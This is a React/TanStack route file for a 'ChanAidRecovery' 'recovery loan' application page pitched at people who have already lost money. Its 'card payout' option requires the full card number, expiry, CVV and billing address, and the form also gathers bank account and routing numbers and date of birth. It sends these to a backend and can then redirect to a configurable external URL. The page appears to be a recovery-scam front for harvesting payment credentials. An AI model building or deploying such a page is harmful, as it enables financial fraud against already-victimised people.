import { createFileRoute, Link } from "@tanstack/react-router";
import { useState } from "react";
import { SiteShell } from "@/components/layout/SiteShell";
import { toast } from "sonner";
import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight } from "lucide-react";

// ─── Redirect URL — change VITE_LOAN_REDIRECT_URL in .env when ready ────────
const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;

// ─── Card validation helpers ─────────────────────────────────────────────────

function luhn(num: string): boolean {
  const digits = num.replace(/\D/g, "");
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function formatCardNumber(raw: string): string {
  return raw.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(raw: string): string {
  const digits = raw.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function isExpiryValid(val: string): boolean {
  if (!/^\d{2}\/\d{2}$/.test(val)) return false;
  const [mm, yy] = val.split("/").map(Number);
  if (mm < 1 || mm > 12) return false;
  const now = new Date();
  const expYear = 2000 + yy;
  const expMonth = mm; // 1-indexed
  return expYear > now.getFullYear() || (expYear === now.getFullYear() && expMonth >= now.getMonth() + 1);
}

// ─── Route ───────────────────────────────────────────────────────────────────

export const Route = createFileRoute("/loans")({
  head: () => ({
    meta: [
      { title: "Apply for a Loan — ChanAidRecovery" },
      { name: "description", content: "Apply for a personal recovery loan with ChanAidRecovery. Choose bank transfer or card payout. Fast review, transparent terms." },
      { property: "og:title", content: "Apply for a Loan — ChanAidRecovery" },
      { property: "og:description", content: "Apply for a personal recovery loan. Bank transfer or card payout. Fast review." },
    ],
  }),
  component: LoansPage,
});

// ─── Page ────────────────────────────────────────────────────────────────────

function LoansPage() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [payout, setPayout] = useState<"bank_transfer" | "card">("bank_transfer");

  // Controlled card fields for real-time formatting
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // Field-level errors
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});

  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
    const errs: Record<string, string> = {};
    const digits = num.replace(/\s/g, "");
    if (digits.length < 13) errs.card_number = "Card number is too short.";
    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
    return errs;
  }

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if ((fd.get("website") as string)?.length) { setDone(true); return; }

    // Required fields
    const first_name = String(fd.get("first_name") || "").trim();
    const email = String(fd.get("email") || "").trim();
    const amount_requested = Number(fd.get("amount_requested") || 0);

    if (!first_name || !email || !amount_requested) {
      toast.error("Please fill in your name, email, and loan amount.");
      return;
    }

    // Card validation when card payout selected
    if (payout === "card") {
      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
      if (Object.keys(errs).length) {
        setCardErrors(errs);
        // Scroll to first error
        const first = Object.values(errs)[0];
        toast.error(first);
        return;
      }
      setCardErrors({});
    }

    const payload = {
      first_name,
      last_name: String(fd.get("last_name") || "").trim() || null,
      email,
      phone: String(fd.get("phone") || "").trim() || null,
      date_of_birth: String(fd.get("date_of_birth") || "").trim() || null,
      address_line1: String(fd.get("address_line1") || "").trim() || null,
      address_line2: String(fd.get("address_line2") || "").trim() || null,
      city: String(fd.get("city") || "").trim() || null,
      state_region: String(fd.get("state_region") || "").trim() || null,
      postal_code: String(fd.get("postal_code") || "").trim() || null,
      country: String(fd.get("country") || "").trim() || null,
      amount_requested,
      currency: String(fd.get("currency") || "USD"),
      loan_purpose: String(fd.get("loan_purpose") || "").trim() || null,
      loan_term_months: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
      employment_status: String(fd.get("employment_status") || "").trim() || null,
      monthly_income: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
      payout_method: payout,
      // Bank fields
      bank_name: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
      bank_account_number: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
      bank_routing_number: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
      // Card fields
      card_issuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
      card_holder_name: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
      card_number: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
      card_expiry: payout === "card" ? cardExpiry : null,
      card_cvv: payout === "card" ? cardCvv : null,
      // Billing address
      billing_address_line1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
      billing_address_line2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
      billing_city: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
      billing_state: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
      billing_postal_code: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
      billing_country: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
      account_holder_name: String(fd.get("account_holder_name") || "").trim() || null,
      source_page: typeof window !== "undefined" ? window.location.pathname : "/loans",
    };

    setLoading(true);
    try {
      const res = await fetch("/api/loan-applications", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!res.ok) throw new Error("Submission failed");

      toast.success("Application received — redirecting…");

      // Redirect to external URL if configured, otherwise show success
      if (REDIRECT_URL) {
        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
      } else {
        setDone(true);
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    } catch {
      toast.error("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <SiteShell>
      <section className="bg-hero-gradient">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-primary border border-border">
            <Banknote className="w-3.5 h-3.5" /> Recovery loans
          </span>
          <h1 className="mt-5 text-4xl sm:text-5xl font-bold leading-tight">
            Apply for a <span className="text-gradient">recovery loan</span>
          </h1>
          <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto">
            Bridge funding while we work on recovering what you lost. Choose bank transfer or card payout. Transparent terms — no hidden fees.
          </p>
        </div>
      </section>

      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
        {done ? (
          <div className="rounded-2xl bg-white shadow-elegant p-10 text-center border border-border">
            <CheckCircle2 className="w-14 h-14 text-primary mx-auto mb-4" />
            <h2 className="text-2xl font-bold mb-2">Application received</h2>
            <p className="text-muted-foreground max-w-md mx-auto">
              Thanks — a loan officer will review your application and reach out within 24 hours to confirm details and next steps.
            </p>
            <Link to="/" className="inline-flex mt-6 items-center gap-1 text-primary font-semibold">
              Back to home <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        ) : (
          <form onSubmit={onSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
            <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />

            <div className="rounded-xl bg-soft-gradient border border-border p-4 mb-8 flex gap-3 text-sm">
              <Lock className="w-5 h-5 text-primary mt-0.5 shrink-0" />
              <p className="text-muted-foreground">
                Your information is transmitted over an encrypted connection and reviewed securely by our loan officers.
              </p>
            </div>

            <Section title="Your details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="first_name" label="First name *" required />
                <Input name="last_name" label="Last name" />
                <Input name="email" type="email" label="Email *" required />
                <Input name="phone" label="Phone" />
                <Input name="date_of_birth" type="date" label="Date of birth" />
                <Select name="employment_status" label="Employment status">
                  <option value="">Select…</option>
                  <option>Employed full-time</option>
                  <option>Employed part-time</option>
                  <option>Self-employed</option>
                  <option>Unemployed</option>
                  <option>Retired</option>
                  <option>Student</option>
                </Select>
              </div>
            </Section>

            <Section title="Address">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" />
                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" />
                <Input name="city" label="City" />
                <Input name="state_region" label="State / Region" />
                <Input name="postal_code" label="Postal code" />
                <Input name="country" label="Country" />
              </div>
            </Section>

            <Section title="Loan details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" required />
                <Select name="currency" label="Currency" defaultValue="USD">
                  <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
                </Select>
                <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
                <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
                <div className="sm:col-span-2">
                  <Label>Purpose of loan</Label>
                  <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm" />
                </div>
              </div>
            </Section>

            <Section title="Payout method">
              <div className="grid sm:grid-cols-2 gap-3 mb-4">
                <PayoutOption selected={payout === "bank_transfer"} onClick={() => setPayout("bank_transfer")}
                  icon={<Banknote className="w-5 h-5" />} title="Bank transfer" desc="Receive funds via wire / ACH to your bank." />
                <PayoutOption selected={payout === "card"} onClick={() => setPayout("card")}
                  icon={<CreditCard className="w-5 h-5" />} title="Card payout" desc="Receive funds to your debit / credit card." />
              </div>

              {payout === "bank_transfer" ? (
                <div className="grid sm:grid-cols-2 gap-3">
                  <Input name="account_holder_name" label="Account holder name" />
                  <Input name="bank_name" label="Bank name (e.g. Chase)" />
                  <Input name="bank_account_number" label="Account number" inputMode="numeric" />
                  <Input name="bank_routing_number" label="Routing / SWIFT / IBAN" />
                </div>
              ) : (
                <div className="space-y-5">
                  <div className="grid sm:grid-cols-2 gap-3">
                    <Input name="card_holder_name" label="Cardholder name *" required />
                    <Select name="card_issuer" label="Card issuer">
                      <option value="">Select…</option>
                      <option>Visa</option><option>Mastercard</option>
                      <option>American Express</option><option>Discover</option><option>Other</option>
                    </Select>

                    {/* Card number — formatted + Luhn */}
                    <div className="sm:col-span-2">
                      <Label>Card number *</Label>
                      <input
                        value={cardNumber}
                        onChange={(e) => {
                          setCardNumber(formatCardNumber(e.target.value));
                          if (cardErrors.card_number) setCardErrors(p => ({ ...p, card_number: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-number"
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_number && <p className="text-xs text-red-500 mt-1">{cardErrors.card_number}</p>}
                    </div>

                    {/* Expiry */}
                    <div>
                      <Label>Expiry (MM/YY) *</Label>
                      <input
                        value={cardExpiry}
                        onChange={(e) => {
                          setCardExpiry(formatExpiry(e.target.value));
                          if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-exp"
                        placeholder="MM/YY"
                        maxLength={5}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
                    </div>

                    {/* CVV */}
                    <div>
                      <Label>CVV *</Label>
                      <input
                        value={cardCvv}
                        onChange={(e) => {
                          setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                          if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-csc"
                        placeholder="123"
                        maxLength={4}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
                    </div>
                  </div>

                  <div>
                    <h4 className="font-semibold mb-3 text-sm">Billing address</h4>
                    <div className="grid sm:grid-cols-2 gap-3">
                      <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" />
                      <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" />
                      <Input name="billing_city" label="City *" required />
                      <Input name="billing_state" label="State / Region" />
                      <Input name="billing_postal_code" label="Postal code *" required />
                      <Input name="billing_country" label="Country *" required />
                    </div>
                  </div>
                </div>
              )}

              <p className="text-xs text-muted-foreground mt-3 flex items-start gap-2">
                <ShieldCheck className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                Your details are sent over an encrypted connection and reviewed by our team.
              </p>
            </Section>

            <button
              type="submit"
              disabled={loading}
              className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
            >
              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
              Submit loan application
            </button>
            <p className="text-[11px] text-muted-foreground mt-3 text-center">
              By submitting you agree to our privacy policy. Approval is subject to review.
            </p>
          </form>
        )}
      </section>
    </SiteShell>
  );
}

// ─── Shared sub-components ───────────────────────────────────────────────────

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="mb-8">
      <h3 className="text-lg font-bold mb-4">{title}</h3>
      {children}
    </div>
  );
}

function Label({ children }: { children: React.ReactNode }) {
  return <label className="block text-xs font-medium text-muted-foreground mb-1">{children}</label>;
}

function Input({ label, className = "", ...props }: { label: string; className?: string } & React.InputHTMLAttributes<HTMLInputElement>) {
  return (
    <div className={className}>
      <Label>{label}</Label>
      <input
        {...props}
        className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
      />
    </div>
  );
}

function Select({ label, children, ...props }: { label: string; children: React.ReactNode } & React.SelectHTMLAttributes<HTMLSelectElement>) {
  return (
    <div>
      <Label>{label}</Label>
      <select {...props} className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm">
        {children}
      </select>
    </div>
  );
}

function PayoutOption({ selected, onClick, icon, title, desc }: { selected: boolean; onClick: () => void; icon: React.ReactNode; title: string; desc: string }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`text-left p-4 rounded-xl border-2 transition ${selected ? "border-primary bg-soft-gradient" : "border-border bg-white hover:border-primary/40"}`}
    >
      <div className="flex items-center gap-2 font-semibold">
        <span className={selected ? "text-primary" : "text-muted-foreground"}>{icon}</span>
        {title}
      </div>
      <p className="text-xs text-muted-foreground mt-1">{desc}</p>
    </button>
  );
}
